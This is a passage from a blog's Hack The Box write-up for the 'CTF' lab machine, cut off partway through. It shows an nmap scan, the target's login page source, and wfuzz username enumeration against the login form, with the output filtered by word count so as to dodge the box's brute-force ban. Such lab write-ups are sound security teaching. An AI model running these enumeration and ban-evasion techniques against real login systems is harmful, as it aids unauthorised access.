<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - CTF - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/feed.xml" title="0xRick" type="application/rss+xml">
</head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><ul>
<li><a href="/misc/c2">Building a Basic C2</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-CTF"><a href="#Hack-The-Box-CTF" class="headerlink" title="Hack The Box - CTF"></a>Hack The Box - CTF</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an <code>ldap</code> injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is <code>10.10.10.122</code>, I added it to <code>/etc/hosts</code> as <code>ctf.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/ctf/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :<br><code>nmap -sV -sT -sC ctf.htb</code><br><img src="/images/hackthebox/ctf/1.png" alt=""><br>Only <code>http</code> on port 80 and <code>ssh</code> on port 22</p>
<h2 id="HTTP-Initial-Enumeration"><a href="#HTTP-Initial-Enumeration" class="headerlink" title="HTTP Initial Enumeration"></a>HTTP Initial Enumeration</h2><p><code>http://ctf.htb</code><br><img src="/images/hackthebox/ctf/2.png" alt=""><br>It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it.<br><img src="/images/hackthebox/ctf/3.png" alt=""><br>We need a username and an <code>OTP</code> (one-time password). An <code>OTP</code> is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid <code>OTP</code>s or to be able to generate valid <code>OTP</code>s ourselves. Let’s take a look at the source code of the login page, maybe something is there :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"description"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"author"</span> <span class="attr">content</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"icon"</span> <span class="attr">href</span>=<span class="string">"/favicon.ico"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CTF login form<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core CSS --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"/dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Custom styles for this template --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"cover.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">""</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cover-container d-flex w-100 h-100 p-3 mx-auto flex-column"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">"masthead mb-auto"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"masthead-brand"</span>&gt;</span>CTF<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"nav nav-masthead justify-content-center"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link active"</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link active"</span> <span class="attr">href</span>=<span class="string">"login.php"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"/login.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> &gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group row"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group row"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"inputUsername"</span> <span class="attr">class</span>=<span class="string">"col-sm-2 col-form-label"</span>&gt;</span>Username<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"inputUsename"</span> <span class="attr">name</span>=<span class="string">"inputUsername"</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group row"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"inputOTP"</span> <span class="attr">class</span>=<span class="string">"col-sm-2 col-form-label"</span>&gt;</span>OTP<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"OTP"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"inputOTP"</span> <span class="attr">name</span>=<span class="string">"inputOTP"</span> <span class="attr">placeholder</span>=<span class="string">"One Time Password"</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group row"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary  name="</span><span class="attr">submit</span>" <span class="attr">value</span>=<span class="string">"Login"</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span>      </span><br><span class="line">      <span class="tag">&lt;<span class="name">footer</span> <span class="attr">class</span>=<span class="string">"mastfoot mt-auto text-center"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>CTF<span class="tag">&lt;/<span class="name">a</span>&gt;</span> by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://www.hackthebox.eu/home/users/profile/13340"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>0xEA31<span class="tag">&lt;/<span class="name">a</span>&gt;</span>. Cover template for <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://getbootstrap.com/"</span>&gt;</span>Bootstrap<span class="tag">&lt;/<span class="name">a</span>&gt;</span>, by <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://twitter.com/mdo"</span>&gt;</span>@mdo<span class="tag">&lt;/<span class="name">a</span>&gt;</span>.<span class="tag">&lt;/<span class="name">p</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">footer</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Bootstrap core JavaScript</span></span><br><span class="line"><span class="comment">    ================================================== --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://code.jquery.com/jquery-3.3.1.slim.min.js"</span> <span class="attr">integrity</span>=<span class="string">"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>These comments look interesting :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;</span></span><br></pre></td></tr></table></figure>
<p>So now we know that they are using a token to generate the <code>OTP</code>s, we also know that the length of the token is 81 digits. But I still couldn’t figure out that part about the attribute they’re using to store the token. I decided to bruteforce the username then return to the <code>OTP</code> thing again.<br>I know what you’re thinking, how will I bruteforce the username without getting banned ? Well I tried to pass any credentials to see how will the application respond :<br><img src="/images/hackthebox/ctf/4.png" alt=""><br><img src="/images/hackthebox/ctf/5.png" alt=""><br>Here I noticed 2 things. First thing is that it’s actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a <code>200 OK</code> response, so If the server identifies a bruteforce attack by monitoring how many times an ip causes errors like <code>404</code> for example, as long as we are not causing errors we won’t get banned. I gave it a try to see if it will actually work. I used <code>wfuzz</code> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt" target="_blank" rel="noopener"><code>multiplesources-users-fabian-fingerle.de.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener">seclists</a> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ctf# wfuzz -c -u http:&#x2F;&#x2F;ctf.htb&#x2F;login.php -X POST -d &quot;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;0000&quot; -w .&#x2F;multiplesources-users-fabian-fingerle.de.txt </span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.3.4 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;ctf.htb&#x2F;login.php</span><br><span class="line">Total requests: 21168</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID   Response   Lines      Word         Chars          Payload    </span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">000007:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;*(&quot;</span><br><span class="line">000008:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;*()&quot;</span><br><span class="line">000010:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;*****&quot;</span><br><span class="line">000002:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#&quot;</span><br><span class="line">000003:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%&quot;</span><br><span class="line">000004:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&quot;</span><br><span class="line">000005:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;&quot;</span><br><span class="line">000009:  C&#x3D;200     68 L      233 W         2827 Ch        &quot;&quot;&quot;&quot;</span><br><span class="line">000006:  C&#x3D;200     68 L      229 W         2810 Ch        &quot;!@#%^&amp;*&quot;</span><br><span class="line">000001:  C&#x3D;200     68 L      233 W         2826 Ch        &quot;-&quot;</span><br><span class="line">000011:  C&#x3D;200     68 L      233 W         2826 Ch        &quot;0&quot;</span><br><span class="line">000012:  C&#x3D;200     68 L      233 W         2827 Ch        &quot;00&quot;</span><br><span class="line">000021:  C&#x3D;200     68 L      233 W         2835 Ch        &quot;0123456789&quot;</span><br><span class="line">000015:  C&#x3D;200     68 L      233 W         2833 Ch        &quot;00000000&quot;</span><br><span class="line">000016:  C&#x3D;200     68 L      233 W         2827 Ch        &quot;01&quot;</span><br><span class="line">^C</span><br><span class="line">Finishing pending requests...</span><br></pre></td></tr></table></figure>
<p>All “user not found” responses have 233 words so I filtered them :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ctf# wfuzz -c --hw 233 -u http:&#x2F;&#x2F;ctf.htb&#x2F;login.php -X POST -d &quot;inputUsername&#x3D;FUZZ&amp;inputOTP&#x3D;0000&quot; -w .&#x2F;multiplesources-users-fabian-fingerle.de.txt                                  </span><br><span class="line"></span><br><span class="line">Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#39;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.3.4 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http:&#x2F;&#x2F;ctf.htb&#x2F;login.php</span><br><span class="line">Total requests: 21168</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">ID   Response   Lines      Word         Chars          Payload    </span><br><span 